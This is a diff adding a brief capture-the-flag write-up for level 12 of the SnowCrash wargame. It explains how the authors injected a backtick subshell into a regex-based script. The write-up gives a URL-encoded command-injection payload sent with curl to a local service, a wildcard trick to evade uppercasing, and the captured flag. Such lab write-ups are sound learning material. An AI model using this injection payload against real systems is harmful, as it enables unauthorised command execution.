@@ -1,0 +1,14 @@
+firstly we cried a lot when we saw that it was a regex
+Secondly when we cat the file we saw that egrep was inside ``
+So the idea was to execute a subshell inside the egrep.
+What we did was :
+echo 'getflag > /var/crash/flag' > /var/crash/123
+make it executable :
+level12@SnowCrash:~$ chmod 777 /var/crash/123
+To be working we need flag to
+Then we encoded the string `/*/*/123`
+Because of the regex we had to put * instead of the repo bc the regex
+put everything on maj.
+
+And we execute this: curl http://127.0.0.1:4646/?x=%60%2F%2A%2F%2A%2F123%60&y=y
+flag = g1qKMiRpXf53AWhDaU7FEkczr
